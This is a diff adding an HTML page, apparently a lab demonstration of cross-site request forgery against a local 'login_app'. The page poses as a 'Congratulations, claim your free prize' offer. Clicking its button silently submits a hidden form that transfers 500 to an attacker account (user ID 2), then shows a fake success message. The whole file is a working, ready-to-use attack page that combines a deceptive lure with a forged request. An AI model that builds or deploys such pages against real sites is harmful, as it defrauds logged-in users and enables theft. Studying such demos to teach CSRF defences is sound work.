@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f8ff;
+        }
+        .prize-box {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 30px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #ff6600;
+        }
+        .claim-button {
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .prize-image {
+            width: 200px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="prize-box">
+        <h1>Congratulations!</h1>
+        <h2>You've Been Selected to Win a Free Prize!</h2>
+        
+        <img src="https://cdn.pixabay.com/photo/2016/03/31/14/37/check-mark-1292787_1280.png" class="prize-image">
+        
+        <p>You are one of our lucky website visitors selected to receive a special gift today!</p>
+        <p>Click the button below to claim your prize immediately.</p>
+        
+        <!-- Hidden CSRF form that transfers money to attacker (user ID 2) -->
+        <iframe style="display:none" name="csrf-frame"></iframe>
+        <form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame">
+            <input type="hidden" name="to_id" value="2">
+            <input type="hidden" name="amount" value="500">
+            <input type="hidden" name="transfer" value="Transfer Money">
+        </form>
+        
+        <button class="claim-button" onclick="document.getElementById('csrf-form').submit(); setTimeout(function() { alert('Congratulations! Your prize claim has been processed!'); }, 1000);">
+            Claim Your Prize Now!
+        </button>
+        
+        <p style="font-size: 12px; margin-top: 30px; color: #999;">
+            Limited time offer. Terms and conditions apply.
+        </p>
+    </div>
+    
+    <script>
+        // Optional: Track if the user is likely logged in to the vulnerable site
+        // This could check for specific cookies or behaviors
+        function checkLoginStatus() {
+            // In a real attack, this might try to detect if the user is logged in
+            console.log("Checking if user is logged in to vulnerable site...");
+        }
+        
+        window.onload = checkLoginStatus;
+    </script>
+</body>
+</html>
